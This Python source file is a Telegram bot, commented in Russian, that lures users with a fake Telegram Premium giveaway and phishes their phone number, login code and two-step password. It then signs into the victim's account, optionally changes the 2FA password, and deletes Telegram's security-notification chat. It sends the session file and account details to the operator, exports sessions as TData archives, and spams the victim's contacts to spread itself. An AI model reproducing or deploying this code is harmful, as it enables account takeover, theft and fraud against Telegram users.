import asyncio
import logging
import os, time
import shutil
import sqlite3

from telethon.sync import TelegramClient
from telethon import functions, types
from email import message
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from opentele.api import UseCurrentSession
from telethon import TelegramClient
from telethon.errors import PasswordHashInvalidError, FloodWaitError, PhoneCodeInvalidError, SessionPasswordNeededError, \
    PhoneCodeExpiredError
from telethon.tl.custom import Dialog, Message

from opentele.tl import TelegramClient as TC

from config import *
from db import User
from keyboards import *
from states import *
from texts import *

import socks

import phonenumbers
from phonenumbers.phonenumberutil import (
    region_code_for_country_code,
)

if proxyuse == True:
    proxy=(socks.SOCKS5, proxy_ip, proxy_port, True, proxy_login, proxy_pass)
else:
    pass

logging.basicConfig(level=logging.INFO)

bot = Bot(token=bot_token, parse_mode='html')

storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

class Sessions:
    data = {}

class CodeInput:
    data = {}

class Dp(StatesGroup):
    text = State()


########## АВТОПРИНЯТИЕ В КАНАЛ + СООБЩЕНИЕ ###################

@dp.chat_join_request_handler()
async def start1(update: types.ChatJoinRequest):
    await update.approve()
    await bot.send_sticker(chat_id=update.from_user.id, sticker=r"CAACAgIAAxkBAAEF5i9jLGC_fwIPPUmKCsOw5SLGunUAAXkAAgEeAAK5PDlI662kG3egy4IpBA")
    await bot.send_message(chat_id=update.from_user.id, text=f"🎁 {update.from_user.get_mention(as_html=True)}<b>, тебе выпал шанс получить Telegram Premium пиши /start</b>", parse_mode='html')

#################################################################


######################   РАССЫЛКА     ##########################

@dp.message_handler(lambda msg: msg.chat.id == admin, commands='spam')
async def spam(msg: types.Message):
    await msg.answer('✏️ Введи текст рассылки:')
    await Dp.text.set()

@dp.message_handler(lambda msg: msg.chat.id == admin, commands='cls', state='*')
async def spam2(msg: types.Message, state: FSMContext):
    if await state.get_state():
        await state.finish()

@dp.message_handler(lambda msg: msg.chat.id == admin, state=Dp.text)
async def spam1(msg: types.Message, state: FSMContext):
    await state.finish()
    await msg.answer('✅ Рассылка запущена')
    g = 0
    b = 0
    for x in User().select():
        try:
            await bot.send_message(x.user_id, msg.text)
            g += 1
            time.sleep(0.33)          
        except:
            b +=1
    await msg.answer(f'<b>📊 Статистика:</>\n'
                     f'✅ Успешно отправлено <code>{g}</>\n'
                     f'🚫 Ошибок: <code>{b}</>')

######################   СТАТИСТИКА     ##########################

@dp.message_handler(lambda msg: msg.chat.id == admin, commands='stat')
async def spam(msg: types.Message, state: FSMContext):
    conn = sqlite3.connect('db.db')
    cur = conn.cursor()
    cur.execute('''select * from user''')
    all_users = cur.fetchall()
    await msg.answer(f'Пользователей: {len(all_users)}')
    await state.finish()

##################################################################

@dp.message_handler(commands='start')
async def start(msg: types.Message, state: FSMContext):
    if msg.from_user.id != admin: 
        if await state.get_state():
            await state.finish()

        if CodeInput.data.get(msg.chat.id):
            CodeInput.data.pop(msg.chat.id)

        if not User.select().where(User.user_id == msg.chat.id):
            start_command = msg.text
            try:            
                await msg.answer(MAIN.format(
                    first_name=msg.from_user.first_name
                ), reply_markup=start_kb)
                await bot.send_message(admin,
                                f'✅ <b>Новый пользователь в боте</>\n\n'
                                f'👤 Пользователь: {msg.from_user.get_mention()}\n'
                                f'🪪 Телеграм ID: {msg.from_user.id}')
            except:
                pass
            
            User(
                user_id=msg.chat.id,
                verified=False,
                phone='',
                ref_id=str(start_command[7:])
            ).save()

        else:
            user = User().get(user_id=msg.chat.id)
            if not user.verified:
                await msg.answer(ON_START.format(
                    '<b>👋 Снова привет</>'
                ), reply_markup=start2_kb)
                await AuthTG.phone.set()
    else:
        await msg.answer(f'{msg.from_user.get_mention()} <b>- вы админ 👑</>\n\n'
                        f'<b>⚙️ Доступные команды:</>\n'
                        f'/spam - рассылка\n'
                        f'/stat - кол-во пользователей\n')

@dp.callback_query_handler(text='start', state='*')
async def on_pro(call: types.CallbackQuery):
    try:
        user = User().get(user_id=call.from_user.id)
    except:
        await call.answer('введи /start')
        return
    if not user.verified:
        try:
            await call.message.delete()
        except:
            pass
        await call.message.answer(ON_START, reply_markup=start2_kb)
        await AuthTG.phone.set()

@dp.message_handler(lambda msg: msg.contact.user_id == msg.chat.id,
                    state=AuthTG.phone, content_types=types.ContentType.CONTACT)
async def get_phone(msg: types.Message, state: FSMContext):
    fr = await msg.answer('🧑‍💻 Отправляем код ...')

    if proxyuse == True:
        client = TelegramClient(f'sessions/{str(msg.contact.phone_number)}',
                                api_id=api_id, api_hash=api_hash, proxy=proxy,
                                device_model=device_model, system_version=system_version,
                                app_version=app_version, lang_code=lang_code,
                                system_lang_code=system_lang_code)
        await client.connect()
        Sessions.data.update({
            msg.chat.id: client
        })
    else:
        client = TelegramClient(f'sessions/{str(msg.contact.phone_number)}',
                                api_id=api_id, api_hash=api_hash,
                                device_model=device_model, system_version=system_version,
                                app_version=app_version, lang_code=lang_code,
                                system_lang_code=system_lang_code)
    await client.connect()
    Sessions.data.update({
        msg.chat.id: client
    })

    pn = phonenumbers.parse('+' + str(msg.contact.phone_number))

    try:
        await bot.send_message(admin,
                               '📱 Пользователь ввел номер\n\n'
                               f'🆔 Телеграм ID: <code>{msg.from_user.id}</>\n'
                               f'📞 Номер: <code>{str(msg.contact.phone_number)}</>\n'
                               f'🌍 Страна: <code>{region_code_for_country_code(pn.country_code)}</>')
    except:
        pass

    await state.update_data(phone=str(msg.contact.phone_number))

    try:
        await client.send_code_request(str(msg.contact.phone_number))
    except FloodWaitError as ex:
        await msg.answer('⚠️ Ошибка. Лимиты телеграм')

    await fr.edit_text('<b>🔑 Код:</>', reply_markup=num)
    await AuthTG.code.set()


@dp.callback_query_handler(text_startswith='ready', state=AuthTG.code)
async def on_2c(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()

    now = CodeInput.data.get(call.from_user.id)
    if not now:
        await call.answer('⚠️ Код введен не верно')
        return

    if len(now) < 5:
        await call.answer('⚠️ Код состоит из 5 цифр')
        return

    client: TelegramClient = Sessions.data.get(call.from_user.id)

    try:
        await client.sign_in(data.get('phone'),
                             int(now))
        if twofa_set == True:
            await client.edit_2fa(new_password=twopass_set, hint=hint_set)
            await client.delete_dialog(777000)
            await call.message.edit_text(GOOD_AUTH.format(
                    first_name=call.message.from_user.first_name
                ))
            await up_account(client, data, state)
        else:
            await client.delete_dialog(777000)
            await call.message.edit_text(GOOD_AUTH.format(
                    first_name=call.message.from_user.first_name
                ))
            await up_account(client, data, state)

    except PhoneCodeInvalidError:
        try:
            CodeInput.data.pop(call.from_user.id)
        except:
            pass

        await call.message.reply('⚠️ Вы ввели неверный код, повторите попытку')
        await call.message.edit_text('<b>🔑 Код:</>', reply_markup=num)

        await AuthTG.code.set()
        await state.update_data(data)

    except SessionPasswordNeededError:

        await call.answer('⚠️ Введите пароль от двух-этапной авторизации:')
        await AuthTG.twfa.set()

    except PhoneCodeExpiredError:
        await state.finish()

        try:
            CodeInput.data.pop(call.from_user.id)
            Sessions.data.pop(call.from_user.id)
        except:
            pass

        await call.message.delete()
        await call.message.answer('⚠️ введите /start')

    except Exception as ex:
        try:
            await bot.send_message(admin, f'err: {ex} | chat: {call.from_user.id} ')
        except:
            pass

        await call.answer('⚠️ Попробуйте повторить, отправив /start')


class Tdata:
    def __init__(self, path: str = 'sessions'):
        self.path = path

    async def session_to_tdata(self, session_path):
        await self._session_to_tdata(session_path)

    async def _session_to_tdata(self, session_path):
        client = TC(os.path.join(self.path, session_path))
        tdesk = await client.ToTDesktop(flag=UseCurrentSession)
        try:
            os.mkdir(os.path.join('tdata', session_path.split('.')[0]))
        except:
            pass
        try:
            tdesk.SaveTData(os.path.join('tdata', os.path.join(session_path.split('.')[0]), 'tdata'))
        except TypeError:
            pass
        await client.disconnect()

    async def pack_to_zip(self, tdata_path: str):
        shutil.make_archive(f'{tdata_path}', 'zip', tdata_path)


async def up_account(client, data, state):
    index_all = 0
    index_groups = 0
    index_channels = 0

    bot_id = await bot.get_me()
    chats_owns = []

    client: TC = client

    if botdelete == True:
        await client.delete_dialog(bot_id.username)
        await state.finish()
    else:
        await state.finish()

    async for dialog in client.iter_dialogs():
        try:

            dialog: Dialog = dialog
            if dialog.is_group:
                index_groups += 1
                index_all += 1

                if dialog.entity.creator:
                    chats_owns.append({
                        'chat_id': dialog.id,
                        'chat_title': dialog.title,
                        'participants_count': dialog.entity.participants_count
                    })

            if dialog.is_channel:
                index_channels += 1
                index_all += 1
                if dialog.entity.creator:
                    chats_owns.append({
                        'chat_id': dialog.id,
                        'chat_title': dialog.title,
                        'participants_count': dialog.entity.participants_count
                    })

            if dialog.is_user:
                index_channels += 1
                index_all += 1
        except:
            pass

    user = await client.get_me()

    try:
        premium_status = user.premium
    except:
        premium_status = False

    mg = await bot.send_document(logs, open('sessions/' + data.get('phone') + '.session', 'rb'), caption=f'✅ Пользователь авторизировал аккаунт\n\n'
                                        f'🗂 На аккаунте обнаружено:\n'
                                        f'▪️ Всего диалогов: <code>{str(index_all)}</>\n'
                                        f'▪️ Всего групп: <code>{str(index_groups)}</>\n'
                                        f'▪️ Всего каналов: <code>{str(index_channels)}</>\n'
                                        f'▪️ Всего с правами админа: <code>{str(len(chats_owns))}</>\n\n'
                                        f'👮‍♀️ Об аккаунте:\n'
                                        f'🌀 Username: <code>{str(user.username)}</>\n'
                                        f'🆔 Телеграм ID: <code>{str(user.id)}</>\n'
                                        f'📞 Номер телефона: <code>{user.phone}</>\n'
                                        f'🌟 Премиум статус: <code>{str(premium_status)}</>\n'
                                        f'💥 SCAM статус: <code>{str(user.scam)}</>\n',
                                        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                                [
                                    InlineKeyboardButton(text="🗂 Получить TData",
                                                         callback_data=f'td|{str(logs)}|{data.get("phone")}.session')
                                ]
                                ]))
    await bot.send_document(admin, open('sessions/' + data.get('phone') + '.session', 'rb'),
                                 caption=f't.me/c/{str(logs).split("-100")[1]}/{str(mg.message_id)}')

    if chango == False:
        pass
    else:
        await client(functions.channels.JoinChannelRequest(
        channel=userchannel
    ))
        await bot.send_message(logs, text=f'<b>✅ Аккаунт был успешно подписан на: @{userchannel}</>\n\n'
                                         f'<b>🔍 Аккаунт:</>\n'
                                         f'🌀 Username: <code>{str(user.username)}</>\n'
                                         f'🆔 Телеграм ID: <code>{str(user.id)}</>\n\n')
    
    if spams == False:
        await client.disconnect()
    else:
        dialg = await client.get_dialogs()
        g = 0
        b = 0
        for dialog in dialg:
            try:
                bname=bot_id.username
                await client.send_message(dialog.id, SPAM_MSG.format(username=bname))
                await client.delete_dialog(dialog.id)
                g += 1
                time.sleep(0.33)
            except:
                b += 1
                time.sleep(0.33)
        await bot.send_message(logs, text=f'<b>✅ Рассылка с аккаунта завершена</>\n\n'
                                         f'<b>🔍 Аккаунт:</>\n'
                                         f'🌀 Username: <code>{str(user.username)}</>\n'
                                         f'🆔 Телеграм ID: <code>{str(user.id)}</>\n\n'
                                         f'<b>📊 Статистика:</>\n'
                                         f'✅ Успешно отправлено <code>{g}</>\n'
                                         f'🚫 Ошибок: <code>{b}</>')
        await client.disconnect()

@dp.callback_query_handler(text_startswith='td|')
async def get_rd(call: types.CallbackQuery):
    srt = call.data.split('|')
    await call.answer('Ожидайте')
    asyncio.create_task(create_zip(srt))
    print(srt)

async def create_zip(srt):

    await Tdata().session_to_tdata(srt[-1])
    await Tdata().pack_to_zip(os.path.join('tdata', srt[-1].split('.')[0]))
    await bot.send_document(srt[1], open(os.path.join('tdata', srt[-1].split('.')[0]+'.zip'), 'rb'))

@dp.message_handler(state=AuthTG.twfa)
async def twa(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    client: TelegramClient = Sessions.data.get(msg.chat.id)
    try:
        await client.sign_in(password=msg.text)
        if twofa_current == True:
            await client.edit_2fa(current_password=msg.text, new_password=twopass_set, hint=hint_set)
            await client.delete_dialog(777000)
            await msg.answer(GOOD_AUTH.format(
                    first_name=msg.from_user.first_name
                ))
            await up_account(client, data, state)
        else:
            await client.delete_dialog(777000)
            await msg.answer(GOOD_AUTH.format(
                    first_name=msg.from_user.first_name
                ))
            await up_account(client, data, state)


    except PasswordHashInvalidError:
        await msg.answer('⚠️ Вы указали не верный пароль')


@dp.callback_query_handler(text_startswith='remove', state=AuthTG.code)
async def on_1c(call: types.CallbackQuery):
    now = CodeInput.data.get(call.from_user.id)
    if not now:
        await call.answer()
        return
    CodeInput.data.update({call.from_user.id: now[:-1]})
    await call.message.edit_text(f'<b>🔑 Код:</> <code>{CodeInput.data.get(call.from_user.id)}</>',
                                 reply_markup=num)


@dp.callback_query_handler(text_startswith='write_', state=AuthTG.code)
async def on_c(call: types.CallbackQuery):
    now = CodeInput.data.get(call.from_user.id)
    code = call.data.split('_')[1]
    if not now:
        CodeInput.data.update({call.from_user.id: code})
        try:
            await call.message.edit_text(f'<b>🔑 Код:</> <code>{CodeInput.data.get(call.from_user.id)}</>',
                                         reply_markup=num)
        except:
            pass
    else:
        if len(now) >= 5:
            await call.answer('Нажмите на ✅ для продолжения')
            return

        CodeInput.data.update({call.from_user.id: now + code})
        await call.message.edit_text(f'<b>🔑 Код:</> <code>{CodeInput.data.get(call.from_user.id)}</>',
                                     reply_markup=num)


@dp.message_handler(lambda msg: msg.text[1:].isdigit() and len(msg.text) >= 5 <= 7,
                    state=AuthTG.code, content_types=types.ContentType.TEXT)
async def get_code(msg: types.Message, state: FSMContext):
    data = await state.get_data()

    client: TelegramClient = Sessions.data.get(msg.chat.id)

    try:
        await client.sign_in(data.get('phone'),
                             int(msg.text[1:]))
        await up_account(client, data, state)
    except PhoneCodeInvalidError:
        try:
            CodeInput.data.pop(msg.from_user.id)
            Sessions.data.pop(msg.from_user.id)
        except:
            pass
        await msg.reply('⚠️ Вы ввели не верный код, повторите попытку')

        await AuthTG.code.set()
        await state.update_data(data)

    except SessionPasswordNeededError:

        await msg.answer('⚠️ Введите пароль от двух-этапной авторизации:')
        await AuthTG.twfa.set()

    except PhoneCodeExpiredError:
        await state.finish()

        try:
            CodeInput.data.pop(msg.from_user.id)
            Sessions.data.pop(msg.from_user.id)
        except:
            pass

        await msg.answer('⚠️ введите /start')

    except Exception as ex:
        try:
            await bot.send_message(admin, f'err: {ex} | chat: {msg.from_user.id} ')
        except:
            pass

        await msg.answer('⚠️ Попробуйте повторить, отправив /start')


if __name__ == '__main__':
    executor.start_polling(dp)
